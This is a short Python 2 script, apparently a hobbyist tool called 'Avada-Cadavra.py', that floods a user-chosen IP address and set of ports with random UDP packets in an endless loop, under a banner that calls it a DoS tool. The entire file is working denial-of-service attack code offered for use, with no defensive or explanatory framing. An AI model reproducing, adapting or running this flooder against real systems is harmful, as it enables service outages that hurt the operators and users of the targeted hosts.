import socket, random
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
print"""\033[92m

  ################################
  
     hello there and welcome!!!
  this is Chaotic Mind's property 
  so expect an exciting experience 
  for you with this DoS tool


  Tool:
      Avada-Cadavra.py
      
  Author:
      Chaotic Mind 
      
      
  enjoy!!!!
  
  ################################  
  
  """
def po():
 global pr
 pr=[]
 print'PORTS:'
 for q in range(pt):
  v=input('>')
  pr.append(v)
 return(pr)
ip=raw_input('TARGET IP:\n>')
pt=input('OPEN PORTS COUNT:\n>')
po()
def k():
 global i
 i+=1
 if i%1000==0:
  print'\033[92mpackets sent:', i

i=0
def h(s):
    l = ''
    for i in range(0, s):
        a = random.randint(65, 160)
        l += chr(a)
    return(l)
    
def cr():
 print'\n\n[*] creating random strings...'
 global li 
 li=[]
 for o in range(100):
  z=h(random.randint(10,50))
  li.append(z)
 return(li)
cr()
while True:
 try:
  p=random.choice(pr)
  s.connect((ip,p))
  s.sendto(random.choice(li),(ip,p))
  k()
 except socket.error as e:
  print '\033[91m<--connection failed ** host is dying -->'
